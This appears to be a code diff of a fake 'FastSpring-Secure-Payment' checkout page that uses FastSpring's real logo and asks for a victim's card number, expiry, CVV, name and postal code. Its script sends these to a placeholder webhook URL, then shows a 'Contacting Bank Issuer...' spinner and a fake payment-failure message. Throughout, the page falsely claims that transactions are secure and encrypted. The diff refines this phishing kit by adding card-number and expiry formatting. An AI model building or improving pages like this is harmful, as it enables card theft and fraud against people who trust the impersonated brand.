@@ -6,257 +6,226 @@
     <title>FastSpring-Secure-Payment</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-   <style>
-    /* Basic Reset */
-    * {
-        box-sizing: border-box;
-        margin: 0;
-        padding: 0;
-        font-family: 'Roboto', sans-serif;
-    }
-
-    body {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        min-height: 100vh;
-        background-color: #f6f9fc;
-        overflow-y: auto;
-    }
-
-    /* Payment Form */
-    .payment-form {
-        background-color: #ffffff;
-        border: 1px solid #e0e6ed;
-        border-radius: 10px;
-        max-width: 500px;
-        padding: 2em;
-        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-        text-align: left;
-        position: relative;
-    }
-
-    /* Header */
-    .header {
-        margin-bottom: 1.5em;
-        text-align: center;
-    }
-
-    .header h2 {
-        font-size: 1.8em;
-        color: #333;
-    }
-
-    /* Amount Display */
-    .amount {
-        font-size: 2em;
-        font-weight: bold;
-        color: #333;
-        margin: 1em 0;
-        text-align: center;
-    }
-
-    /* Payment Options */
-    .payment-options {
-        display: flex;
-        justify-content: space-between;
-        margin-bottom: 1em;
-    }
-
-    .payment-button {
-        background: #f7f7f7;
-        border: 1px solid #ccc;
-        border-radius: 5px;
-        width: 32%;
-        padding: 1em;
-        cursor: not-allowed; /* Indicates non-functionality */
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 1em;
-        color: #333;
-        transition: background 0.3s;
-    }
-
-    .payment-button:hover {
-        background-color: #e0e6ed;
-    }
-
-    .payment-button img {
-        max-width: 100%; /* Logo fills the box */
-        max-height: 100%; /* Prevents logos from exceeding their box */
-        object-fit: contain; /* Keeps aspect ratio */
-    }
-
-    .or-pay-with {
-        text-align: center;
-        margin: 1em 0;
-        color: #666;
-    }
-
-    /* Form Group */
-    .form-group {
-        margin-bottom: 1.5em;
-        position: relative;
-    }
-
-    .form-group label {
-        display: block;
-        font-size: 0.9em;
-        color: #666;
-        margin-bottom: 0.3em;
-    }
-
-    .form-group input {
-        width: 100%;
-        padding: 0.75em 0.8em;
-        border-radius: 5px;
-        border: 1px solid #ccd0d5;
-        font-size: 1em;
-        height: 45px;
-        transition: border 0.3s;
-    }
-
-    .form-group input:focus {
-        border-color: #635bff;
-        outline: none;
-    }
-
-    /* Icons */
-    .form-group i {
-        position: absolute;
-        top: 50%;
-        left: 12px;
-        transform: translateY(-50%);
-        color: #a3a9b0;
-        font-size: 1.1em;
-    }
-
-    /* Submit Button */
-    .btn-submit {
-        width: 100%;
-        padding: 1em;
-        background-color: #635bff;
-        color: #ffffff;
-        font-size: 1.1em;
-        font-weight: bold;
-        border: none;
-        border-radius: 5px;
-        cursor: pointer;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        margin-top: 1em;
-        transition: background 0.3s;
-        position: relative;
-        overflow: hidden;
-    }
-
-    .btn-submit:hover {
-        background-color: #5249d8;
-    }
-
-    .note {
-        font-size: 0.85em;
-        color: #888;
-        margin-top: 1em;
-        text-align: center;
-    }
-
-    /* Loading Overlay */
-    .loading-overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(255, 255, 255, 0.9);
-        display: none; /* Hidden by default */
-        justify-content: center;
-        align-items: center;
-        z-index: 999;
-    }
-
-    .loading-content {
-        text-align: center;
-    }
-
-    .loading-spinner {
-        border: 8px solid #f3f3f3; /* Light grey */
-        border-top: 8px solid #635bff; /* Blue */
-        border-radius: 50%;
-        width: 40px;
-        height: 40px;
-        animation: spin 1s linear infinite;
-        margin-bottom: 1em;
-    }
-
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-
-    /* Failure Message */
-    .failure-message {
-        display: none; /* Hidden by default */
-        text-align: center;
-        margin-top: 1.5em;
-        color: #dc3545; /* Red color */
-        font-size: 1.2em;
-        font-weight: bold;
-        background-color: #f8d7da; /* Light red background */
-        padding: 1em;
-        border: 1px solid #f5c6cb; /* Red border */
-        border-radius: 5px;
-        position: relative;
-        animation: fadeIn 0.5s ease; /* Fade in animation */
-    }
-
-    .failure-message i {
-        color: #dc3545; /* Red color for the icon */
-        font-size: 2em;
-        display: block;
-        margin-bottom: 0.5em; /* Space below the icon */
-    }
-
-    @keyframes fadeIn {
-        from { opacity: 0; }
-        to { opacity: 1; }
-    }
-
-    /* Responsive adjustments */
-    @media (max-width: 600px) {
+    <style>
+        /* Basic Reset */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f6f9fc;
+            overflow-y: auto;
+        }
+        /* Payment Form */
         .payment-form {
-            width: 90%;
-            padding: 1.5em;
+            background-color: #ffffff;
+            border: 1px solid #e0e6ed;
+            border-radius: 10px;
+            max-width: 500px;
+            padding: 2em;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            text-align: left;
+            position: relative;
         }
-
+        /* Header */
+        .header {
+            margin-bottom: 1.5em;
+            text-align: center;
+        }
         .header h2 {
-            font-size: 1.5em;
+            font-size: 1.8em;
+            color: #333;
         }
-
+        /* Amount Display */
         .amount {
-            font-size: 1.5em;
+            font-size: 2em;
+            font-weight: bold;
+            color: #333;
+            margin: 1em 0;
+            text-align: center;
         }
-
-        .btn-submit {
+        /* Payment Options */
+        .payment-options {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 1em;
+        }
+        .payment-button {
+            background: #f7f7f7;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            width: 32%;
+            padding: 1em;
+            cursor: not-allowed; /* Indicates non-functionality */
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 1em;
+            color: #333;
+            transition: background 0.3s;
         }
-
+        .payment-button:hover {
+            background-color: #e0e6ed;
+        }
+        .payment-button img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+        .or-pay-with {
+            text-align: center;
+            margin: 1em 0;
+            color: #666;
+        }
+        /* Form Group */
+        .form-group {
+            margin-bottom: 1.5em;
+            position: relative;
+        }
+        .form-group label {
+            display: block;
+            font-size: 0.9em;
+            color: #666;
+            margin-bottom: 0.3em;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 0.75em 0.8em;
+            border-radius: 5px;
+            border: 1px solid #ccd0d5;
+            font-size: 1em;
+            height: 45px;
+            transition: border 0.3s;
+        }
+        .form-group input:focus {
+            border-color: #635bff;
+            outline: none;
+        }
+        /* Icons */
+        .form-group i {
+            position: absolute;
+            top: 50%;
+            left: 12px;
+            transform: translateY(-50%);
+            color: #a3a9b0;
+            font-size: 1.1em;
+        }
+        /* Submit Button */
+        .btn-submit {
+            width: 100%;
+            padding: 1em;
+            background-color: #635bff;
+            color: #ffffff;
+            font-size: 1.1em;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 1em;
+            transition: background 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-submit:hover {
+            background-color: #5249d8;
+        }
         .note {
-            font-size: 0.75em;
+            font-size: 0.85em;
+            color: #888;
+            margin-top: 1em;
+            text-align: center;
         }
-
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+        }
+        .loading-content {
+            text-align: center;
+        }
+        .loading-spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #635bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 1em;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Failure Message */
         .failure-message {
-            font-size: 1em; /* Smaller font for mobile */
+            display: none;
+            text-align: center;
+            margin-top: 1.5em;
+            color: #dc3545;
+            font-size: 1.2em;
+            font-weight: bold;
+            background-color: #f8d7da;
+            padding: 1em;
+            border: 1px solid #f5c6cb;
+            border-radius: 5px;
+            position: relative;
+            animation: fadeIn 0.5s ease;
         }
-    }
-</style>
+        .failure-message i {
+            color: #dc3545;
+            font-size: 2em;
+            display: block;
+            margin-bottom: 0.5em;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        /* Responsive adjustments */
+        @media (max-width: 600px) {
+            .payment-form {
+                width: 90%;
+                padding: 1.5em;
+            }
+            .header h2 {
+                font-size: 1.5em;
+            }
+            .amount {
+                font-size: 1.5em;
+            }
+            .btn-submit {
+                font-size: 1em;
+            }
+            .note {
+                font-size: 0.75em;
+            }
+            .failure-message {
+                font-size: 1em;
+            }
+        }
+    </style>
 </head>
 <body>
     <div class="payment-form">
-       <div class="logo">
-           <img src="https://fastspring.com/wp-content/themes/fastspring-bamboo/images/logos/fastspring-logo-orange-gray.svg?2" alt="Your Company Logo" style="max-width: 30%; height: auto; margin-bottom: 1em;">
+        <div class="logo">
+            <img src="https://fastspring.com/wp-content/themes/fastspring-bamboo/images/logos/fastspring-logo-orange-gray.svg?2" alt="Your Company Logo" style="max-width: 30%; height: auto; margin-bottom: 1em;">
         </div>
         <div class="header">
             <h2>Pay Axle098:</h2>
@@ -279,64 +248,73 @@
         <div class="or-pay-with">or pay with:</div>
 
         <form id="paymentForm">
-    <div class="form-group">
-        <label for="cardholderName">Cardholder Name</label>
-        <input type="text" id="cardholderName" placeholder="John Doe" required>
-    </div>
-    
-    <div class="form-group">
-        <label for="zipcode">Zipcode / Postal Code</label>
-        <input type="text" id="zipcode" placeholder="Postal Code" required>
-    </div>
+            <div class="form-group">
+                <label for="cardholderName">Cardholder Name</label>
+                <input type="text" id="cardholderName" placeholder="John Doe" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="zipcode">Zipcode / Postal Code</label>
+                <input type="text" id="zipcode" placeholder="12345" required>
+            </div>
 
-    <div class="form-group">
-        <label for="fullAddress">Full Address</label>
-        <input type="text" id="fullAddress" placeholder="123 Main St" required>
-    </div>
+            <div class="form-group">
+                <label for="cardNumber">Card Number</label>
+                <i class="far fa-credit-card"></i>
+                <input type="text" id="cardNumber" placeholder="1111 2222 3333 4444" required>
+            </div>
 
-    <div class="form-group">
-        <label for="cardNumber">Card Number</label>
-        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19">
-    </div>
-    <div class="form-group">
-        <label for="expiryDate">Expiration Date (MM/YY)</label>
-        <input type="text" id="expiryDate" placeholder="MM/YY" required maxlength="5">
-    </div>
-    <div class="form-group">
-        <label for="cvv">CVV</label>
-        <input type="text" id="cvv" placeholder="123" required maxlength="3">
-    </div>
+            <div class="form-group">
+                <label for="expirationDate">Expiration Date (MM/YY)</label>
+                <input type="text" id="expirationDate" placeholder="MM/YY" required>
+            </div>
 
-    <button type="submit" class="btn-submit">
-        Pay £1.00
-    </button>
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" placeholder="123" required>
+            </div>
 
-    <p class="note">All information is encrypted, your sensitive data is never stored.</p>
-    <p class="note">Anti-Fraud Settings Enabled.</p>
-</form>
+            <button type="submit" class="btn-submit">Pay Now</button>
+        </form>
 
-        <!-- Loading Overlay -->
+        <div class="note">All transactions are secure and encrypted.</div>
+        
         <div class="loading-overlay" id="loadingOverlay">
             <div class="loading-content">
                 <div class="loading-spinner"></div>
-                <p>Contacting Bank Issuer...</p>
+                <div class="loading-text">Contacting Bank Issuer...</div>
             </div>
         </div>
 
-        <!-- Failure Message -->
-<div class="failure-message" id="failureMessage" style="display: none;">
-    <i class="fas fa-times-circle" style="color: red;"></i>
-    <span style="color: red; font-weight: bold;">Card Declined!</span> Please check your details and try again.
-</div>
-
+        <div class="failure-message" id="failureMessage">
+            <i class="fas fa-exclamation-circle"></i>
+            Payment failed. Please try again.
+        </div>
     </div>
 
 <script>
 const form = document.getElementById('paymentForm');
 
-async function getWebhookURL() {
-    const webhookURL = 'YOUR_WEBHOOK_URL_HERE'; // Replace with your actual webhook URL
-    return webhookURL;
+// Function to format card number with spaces
+function formatCardNumber(input) {
+    // Remove all non-digit characters
+    let value = input.value.replace(/\D/g, '');
+    // Format to "0000 0000 0000 0000"
+    value = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Adds space after every 4 digits
+    input.value = value.trim(); // Remove any trailing spaces
+}
+
+// Function to format expiration date with a slash
+function formatExpiryDate(input) {
+    // Remove all non-digit characters
+    let value = input.value.replace(/\D/g, '');
+    // Format to "MM/YY"
+    if (value.length >= 3) {
+        value = value.replace(/(\d{2})(\d{0,2})/, '$1/$2'); // Add slash after the second digit
+    } else {
+        value = value.replace(/(\d{2})(\d{0,2})/, '$1$2'); // No slash until at least 2 digits
+    }
+    input.value = value;
 }
 
 form.addEventListener('submit', async function(event) {
@@ -363,7 +341,7 @@ form.addEventListener('submit', async function(event) {
 
     try {
         // Get the webhook URL directly
-        const webhookURL = await getWebhookURL();
+        const webhookURL = 'YOUR_WEBHOOK_URL_HERE'; // Replace with your actual webhook URL
 
         // Send the payment data to the webhook
         const response = await fetch(webhookURL.trim(), {
@@ -399,8 +377,15 @@ form.addEventListener('submit', async function(event) {
         }, timeToWait); // Wait time adjusted
     }
 });
-</script>
 
+document.getElementById('cardNumber').addEventListener('input', function() {
+    formatCardNumber(this);
+});
+
+document.getElementById('expirationDate').addEventListener('input', function() {
+    formatExpiryDate(this);
+});
+</script>
 
 
 </body>
